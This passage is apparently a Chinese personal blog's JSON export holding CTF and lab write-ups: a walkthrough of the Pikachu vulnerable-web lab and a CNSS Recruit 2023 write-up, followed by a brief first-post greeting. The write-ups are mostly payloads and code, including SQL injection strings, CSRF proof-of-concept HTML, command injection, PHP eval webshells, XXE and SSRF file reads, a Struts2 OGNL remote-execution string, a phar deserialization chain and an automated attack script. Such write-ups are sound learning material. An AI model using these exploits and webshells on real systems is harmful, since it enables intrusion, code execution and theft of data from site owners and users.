1’&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt; CSRF1.CSRF(get) login抓包修改个人信息，用burp生成csrf poc: 1234567891011121314&lt;html&gt; &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt; &lt;body&gt; &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt; &lt;form action=&quot;http://127.0.0.1/pikachu/vul/csrf/csrfget/csrf_get_edit.php&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;sex&quot; value=&quot;hacker&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;phonenum&quot; value=&quot;hacker&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;add&quot; value=&quot;hacker&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;hacker&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 打开链接：http://burp/show/4/2etstzgrlo1eqv1ef15ihs9u0bxp6ybb 发现成功修改（kobe账户需处于登录状态） 2.CSRF(post)改成post传参，其他和1相同，不多赘述 3.CSRF Token遇到token还是不会 搜了一下要用到burp的CSRF Token Tracker插件 添加如图的规则 然后生成poc SQL-Inject1.数字型注入抓包，直接放playload吧 1234567id=-1 union select database(),2//爆库名id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()//爆表名id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;//爆列名id=-1 union select username,password from users//爆账号密码 爆出来了 2.字符型注入注意闭合，其他和1一样 playload: 11’union select username,password from users# 3.搜索型注入只是多了一列 playload: 11&#x27;union select username,password,1 from pikachu.users# 4. XX型注入用 ‘) 来闭合 playlaod: 11&#x27;)union selct username,password from users # 5. insert&#x2F;update注入没有回显，使用报错注入 playload: 12345671&#x27; and extractvalue(1,concat(0x7e,(database()))) and &#x27;1&#x27;=&#x27;1 1&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;pikachu&#x27; limit 0,1)),0) and &#x27;1&#x27;=&#x27;11&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1)),0) and &#x27;1&#x27;=&#x27;11&#x27; and updatexml(1,concat(0x7e,(select id from users limit 0,1)),0) and &#x27;1&#x27;=&#x27;1 6.Delete注入还挺新颖的，留言板无法注入，随便输入，然后删除，抓包 抓包发现get传了一个id，那么利用id注入，还是用报错注入 注意： 一些关键字如#，空格需要进行URL格式转换 7.http头注入根据提示登录抓包，用user-agent进行注入 playlaod: 1&#x27; or updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;^&#x27;,password)) from users),1,31),0x7e),1) or &#x27; 8.布尔盲注上python脚本吧，把做sql的题目的脚本捡起来改改 脚本就是方便啊 9.延时盲注把上面的脚本改改，延时耗时太长了，不赘述了 10. 宽字节注入lili%df’ or 1&#x3D;2 继续改布尔盲注的脚本吧 RCE1.exec “ping”playload: 1ping 127.0.0.1 |whoami 2.exec “eval”playload: 1phpinfo(); File Inclusion1.本地文件包含图片路径可修改，改为..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;win.ini 成功查win.ini文件，那么我们在本地写一个木马，就能通过这种方式用蚁剑连接了 2.远程文件包含创建一个shell.txt: 1&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[leon]) ?&gt; &#x27; ); ?&gt; playload: 1http://127.0.0.1/pikachu/vul/fileinclude/fi_remote.php?filename=G:\\phpstudy_pro\\WWW\\pikachu\\vul\\fileinclude\\shell.txt&amp;submit=%E6%8F%90%E4%BA%A4 成功生成shell.php，蚁剑连接 不安全的文件下载1.不安全的文件下载想找科比的路径，看到了有意思的东西 修改路径 点击成功下载 Unsafe file upload1.客户端check这里抓包改后缀或者浏览器关闭js都可以，我选择后者 2.服务端check这里直接抓包改后缀就行 3.getimagesize()大小不对的图片会被打回来，先在正常图片中插入一句话木马，但不会执行php语句，只能结合上上关的文件包含漏洞 playload: 1http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/shell.php&amp;submit=%E6%8F%90%E4%BA%A4 Over permission1.水平越权 在url这里把username改成别的用户 2.垂直越权登录admin账户，点击添加账户，并且记住url: 1http://127.0.0.1/pikachu/vul/overpermission/op2/op2_admin_edit.php 登录普通pikachu账户，然后直接复制上面的链接进行添加账户，再登录admin账户，发现成功添加，那么就存在垂直越权。 ..&#x2F;..&#x2F;1.目录遍历playload: 1http://127.0.0.1/pikachu/vul/dir/dir_list.php?title=../../../../../../Windows/win.ini 敏感信息泄露1.find abc f12找到账户 黄金时代👍我也很喜欢这一段 可以直接修改url得到敏感信息 PHP反序列化1.PHP反序列化漏洞没找到反序列化的代码，试了一下给的playload: 1O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;&#125; 发现可以 XXE1.XXE漏洞playload: 1234&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file:///c:/windows/win.ini&quot; &gt; ]&gt; &lt;foo&gt;&amp;xxe;&lt;/foo&gt; url重定向1.不安全的url跳转 如图修改，点击则跳转百度 SSRF1.SSRF(curl)playload: 1http://127.0.0.1/pikachu/vul/ssrf/ssrf_curl.php?url=file:///c:/Windows/win.ini 2.SSRF(file_get_content)playload: 1http://127.0.0.1/pikachu/vul/ssrf/ssrf_fgc.php?file=file:///c:/windows/win.ini","categories":[{"name":"writeup","slug":"writeup","permalink":"https://foreon.github.io/categories/writeup/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://foreon.github.io/tags/ctf/"}]},{"title":"CNSS Recruit 2023 Writeup","slug":"CNSS Recruit 2023 Writeup","date":"2023-11-03T15:47:10.000Z","updated":"2023-11-03T15:56:20.139Z","comments":true,"path":"posts/16427.html","link":"","permalink":"https://foreon.github.io/posts/16427.html","excerpt":"","text":"CNSS Recruit 2023 WriteupWeb1.📗 CNSS 2023 Web Guideline没什么好说的 2.🙋 PHPinfo&#x2F;phpinfo()找到flag 3.🦴 babyHTTP按提示来就行 4.🏓 Pingping 127.0.0.1;ls &#x2F; # 找到flag ping 127.0.01;cat &#x2F;flag # 得到flag 5.🥇 我得再快点脚本如下 1234567891011121314151617181920212223242526272829303132import hashlibfrom hashlib import md5import requestss=requests.Session()url=&#x27;http://124.221.34.13:55590/&#x27;r=s.get(url)res=r.texta=res.find(&quot;&lt;p&gt;&quot;)b=res.find(&quot;/p&gt;&quot;,a)#找到我们要计算的式子的前后位置num=res[a+9:b-28]print(a)print(b)print(num)m = hashlib.md5()m.update(num.encode(&quot;utf-8&quot;))encodeStr = m.hexdigest()print (encodeStr)en=str.upper(encodeStr)print(en)playload=&#123; &#x27;value&#x27;:en&#125;r=s.get(url=url,params=playload)print(r.content)url2=&#x27;http://124.221.34.13:55590/check?value=&#x27;+encodeStrr2=s.get(url2)print(r2.text) 🐶 CNSS娘の宠物商店使用双等号绕过，原理： ![](G:\\hexo-blog\\source_posts\\CNSS Recruit 2023 Writeup.assets\\65450d1eb6ea8.png)密码输入’&#x3D;‘ ![](G:\\hexo-blog\\source_posts\\CNSS Recruit 2023 Writeup.assets\\65450d34c9074.png) 6.🥵 2048卡了一会，发现所有数据变化都在前端完成的，那么只要在前端做文章就行。看了一圈就改JavaScript吧(我之前还不知道JavaScript文件能在源代码界面修改并保存的 找到score的判定条件然后改成0保存，得到flag 7.👤 换个头像先发现只能上传图片，随便上传一个图片木马，然后burp抓包，把.png后缀改成.php，蚁剑连接 8.7️⃣ EZRCCCCE在tim大佬的提示下做出来了 ![](G:\\hexo-blog\\source_posts\\CNSS Recruit 2023 Writeup.assets\\65450d3fcb5f7.png) 过滤了一些东西，但是限制长度了 明显要用命令拼接来过题，注意这里的sandbox是给我们创建了一个私人路径，我就是卡在这一步了 playload: 1234567891011121314151617181920&gt;hp&gt;1.p\\\\&gt;d\\&gt;\\\\&gt;\\ -\\\\&gt;e64\\\\&gt;bas\\\\&gt;7\\|\\\\&gt;XSk\\\\&gt;Fsx\\\\&gt;dFV\\\\&gt;kX0\\\\&gt;bCg\\\\&gt;XZh\\\\&gt;AgZ\\\\&gt;waH\\\\&gt;PD9\\\\&gt;o\\ \\\\&gt;ech\\\\ls -t&gt;0sh 0 脚本： 1234567891011121314#!/usr/bin/python# -*- coding: UTF-8 -*-import requestsurl = &quot;http://124.221.34.13:55559/?6=&#123;0&#125;&quot;print(&quot;[+]start attack!!!&quot;)with open(&quot;payload.txt&quot;,&quot;r&quot;) as f: for i in f: print(&quot;[*]&quot; + url.format(i.strip())) s=requests.get(url.format(i.strip())) print((s.text))#检查是否攻击成功test = requests.get(&quot;http://124.221.34.13:55559/sandbox/5466482a195fb9b91138de0cb507f8bf/1.php&quot;)if test.status_code == requests.codes.ok: print(&quot;[*]Attack success!!!&quot;) 这里检查成功的路径要pwd查一下 ![](G:\\hexo-blog\\source_posts\\CNSS Recruit 2023 Writeup.assets\\65450d448f878.png) 然后ls &#x2F;看到flag把它cat出来，这里注意分号闭合语句 10.🐱 Tomcat?cat~猫猫可爱捏 这题考察struts2漏洞 ![](G:\\hexo-blog\\source_posts\\CNSS Recruit 2023 Writeup.assets\\65450d4aaf617.png) 参考csdn文章：CTFshow刷题日记-WEB-JAVA（web279-300）Struts2全漏洞复现，Java漏洞复现_debug&#x3D;command&amp;expression表达式注入漏洞如何修复_OceanSec的博客-CSDN博客 12POC:&#x27; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;cat webapps/flaaaaaaag/flag.jsp&#x27;).getInputStream())) + &#x27; 这题flag藏的有点深，一般在目录就看到了，问了大佬才做出来，一度以为方向错了😭 大佬说是struts2有点太简单了，藏深点上上难度 ![](G:\\hexo-blog\\source_posts\\CNSS Recruit 2023 Writeup.assets\\65450da2e60d4.png) 🔧 where is my unserialize?这题学到了不少，也踩了不少坑 首先file&#x3D;xxx.php是可以查原码的 ![](G:\\hexo-blog\\source_posts\\CNSS Recruit 2023 Writeup.assets\\65450da3c364c.png) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101class.php&lt;?phpclass CNSS&#123; public $shino; public $shin0; public $name; public function __construct($name) &#123; $this-&gt;name=$name; &#125; public function __wakeup() &#123; $this-&gt;shin0 = &#x27;cnss&#x27;; $this-&gt;_sayhello(); &#125; public function _sayhello() &#123; echo (&#x27;&lt;h1&gt;I know you are in a hurry, but don not rush yet.&lt;h1&gt;&#x27;); &#125; public function __destruct() &#123; $this-&gt;shin0 = $this-&gt;name; echo $this-&gt;shin0.&#x27;&lt;br&gt;&#x27;; &#125;&#125;class CN55&#123; public $source; public $params; public function __construct()&#123; $this-&gt;params = array(); &#125; public function __invoke() &#123; return $this-&gt;_get(&#x27;key&#x27;); &#125; public function _get($key) &#123; if(isset($this-&gt;params[$key])) &#123; $value = $this-&gt;params[$key]; &#125; else &#123; $value = &quot;index.php&quot;; &#125; return $this-&gt;file_get($value); &#125; public function file_get($value) &#123; $text = base64_encode(file_get_contents($value)); return $text; &#125;&#125;class Show&#123; public $key; public $haha; public function __construct($file) &#123; $this-&gt;key = $file; echo $this-&gt;key.&#x27;&lt;br&gt;&#x27;; &#125; public function __toString() &#123; $func = $this-&gt;haha[&#x27;hehe&#x27;]; return $func(); &#125; public function __call($key,$value) &#123; $this-&gt;$key = $value; &#125; public function _show() &#123; if(preg_match(&#x27;/http|https|file:|gopher|dict|\\.\\.|f1ag/i&#x27;,$this-&gt;source)) &#123; die(&#x27;&lt;h1&gt;hackerrrrrr!&lt;br&gt;join CNSS~&lt;h1&gt;&#x27;); &#125; else &#123; highlight_file($this-&gt;source); &#125; &#125; public function __wakeup() &#123; if(preg_match(&quot;/http|https|file:|gopher|dict|\\.\\./i&quot;, $this-&gt;source)) &#123; //Do you know &#x27;Php ARchive&#x27;? echo &quot;hacker~&quot;; $this-&gt;source = &quot;index.php&quot;; &#125; &#125;&#125;?&gt; 没有unserilize()，再加上上传文件，考察phar反序列化 原理： ![](G:\\hexo-blog\\source_posts\\CNSS Recruit 2023 Writeup.assets\\65450da4cece0.png) 这里先记录一下为什么第一次我没能成功 第一次的poc: ![](G:\\hexo-blog\\source_posts\\CNSS Recruit 2023 Writeup.assets\\65450da5b107b.png) 错在赋值不能以$cnss()的形式，因为都要赋值常数！！ 成功的POC: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?phpclass CNSS&#123; public $shino; public $shin0; public $name;&#125;class CN55&#123; public $source; public $params; public function __invoke() &#123; &#125;&#125;class Show&#123; public $key; public $haha; public function __construct($file) &#123; $this-&gt;key = $file; echo $this-&gt;key.&#x27;&lt;br&gt;&#x27;; &#125; public function __toString() &#123; $func = $this-&gt;haha[&#x27;hehe&#x27;]; return $func(); &#125; public function __call($key,$value) &#123; $this-&gt;$key = $value; &#125;&#125;$cn=new CNSS(&#x27;cnss&#x27;);$cnss =new CN55();$s=new show(&#x27;6&#x27;);$s-&gt;haha[&#x27;hehe&#x27;]=$cnss;$cnss-&gt;params[&#x27;key&#x27;]=&#x27;/var/www/html/f1ag.php&#x27;;$cn-&gt;name=$s;$phar = new Phar(&quot;1.phar&quot;); $phar-&gt;startBuffering();$phar-&gt;setStub(&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;); $phar-&gt;setMetadata($cn); $phar-&gt;addFromString(&quot;leon.txt&quot;, &quot;leon&quot;); $phar-&gt;stopBuffering();?&gt; 拿到flag了 🚓 can can need shell在大佬的不断提示下整出来了，菜鸟成长全靠老师傅们😭 根据提示加&#x2F;admin ![](G:\\hexo-blog\\source_posts\\CNSS Recruit 2023 Writeup.assets\\65450da76eb70.png) 提示了账号密码都是admin ![](G:\\hexo-blog\\source_posts\\CNSS Recruit 2023 Writeup.assets\\65450da84afcc.png) 进入管理员后台，这题考察lavarel模板文件上传漏洞，找到下图的教程，原理是burp抓包jpg马，然后后缀加.php蚁剑连接，但是这题有waf waf: 12345678910111213141516public function waf($file)&#123; $dangerous = array(&#x27;eval&#x27;,&#x27;assert&#x27;,&#x27;serialize&#x27;,&#x27;link&#x27;,&#x27;open&#x27;,&#x27;write&#x27;,&#x27;_&#x27;,&#x27;get&#x27;,&#x27;post&#x27;,&#x27;passthru&#x27;,&#x27;system&#x27;,&#x27;exec&#x27;,&#x27;ch&#x27;,&#x27;scandir&#x27;,&quot;input&quot;,&quot;file&quot;,&quot;call&quot;,&quot;dl&quot;,&quot;syslog&quot;,&quot;putenv&quot;,&quot;[&quot;,&quot;]&quot;,&quot;`&quot;,&quot;*&quot;,&quot;+&quot;,&quot;|&quot;,&quot;url&quot;,&quot;flag&quot;,&quot;&#123;&quot;,&quot;&#125;&quot;,&quot;@&quot;,&quot;(&quot;,&quot;)&quot;); $handle = fopen($file-&gt;getRealPath(), &quot;r&quot;); while (($line = fgets($handle)) !== false) &#123; foreach($dangerous as $value)&#123; $res = stristr($line,$value); if($res != false)&#123; fclose($handle); return false; &#125; &#125; &#125; fclose($handle); return true; &#125; 禁了很多东西，没禁用单引号，在大佬的提示下考虑include文件包含 1234include.php&lt;?phpinclude &#x27;1.jpg&#x27;?&gt; 121.jpg &lt;?php @eval($_POST[&quot;leon&quot;]);?&gt; 都上传后，蚁剑连接 xxx&#x2F;xxxx&#x2F;include.php 就成了 9.🏭 EzPollution_pre这题注意nodejs容器使用一次就损坏了，所以在本地跑通，重启会方便一点 然后根据原型链污染的原理像图中这样post,注意要用js的函数把flag给cat出来 ![](G:\\hexo-blog\\source_posts\\CNSS Recruit 2023 Writeup.assets\\65450db13d87c.png) CNSS{v2ry_ea5y_N0dejs} Re1.📦 Bin Guideline无话可说 2.😍 那个女人打开就送 3.😢 我的flag碎了一地F5 根据提示打开String窗口 第二段在function找到 ![](G:\\hexo-blog\\source_posts\\CNSS Recruit 2023 Writeup.assets\\65450db40b413.png) 第三段右键查看引用图 找到func718 拼接一下CNSS{My_fl@g_h4s_br0ken_4parT_ Bu7_Y0u_c@n_f1x_1t!}","categories":[{"name":"writeup","slug":"writeup","permalink":"https://foreon.github.io/categories/writeup/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://foreon.github.io/tags/ctf/"}]},{"title":"我的第一篇博客","slug":"first blog","date":"2023-11-02T12:15:27.000Z","updated":"2023-11-03T15:41:37.813Z","comments":true,"path":"posts/51727.html","link":"","permalink":"https://foreon.github.io/posts/51727.html","excerpt":"","text":"我开始写博客了！此博客诞生于2023年11月2日。 今后我应该会更新一些随笔、ctf比赛writeup和学习总结。","categories":[{"name":"随笔","slug":"随笔","permalink":"https://foreon.github.io/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"打招呼","slug":"打招呼","permalink":"https://foreon.github.io/tags/%E6%89%93%E6%8B%9B%E5%91%BC/"}]}],"categories":[{"name":"writeup","slug":"writeup","permalink":"https://foreon.github.io/categories/writeup/"},{"name":"随笔","slug":"随笔","permalink":"https://foreon.github.io/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://foreon.github.io/tags/ctf/"},{"name":"打招呼","slug":"打招呼","permalink":"https://foreon.github.io/tags/%E6%89%93%E6%8B%9B%E5%91%BC/"}]}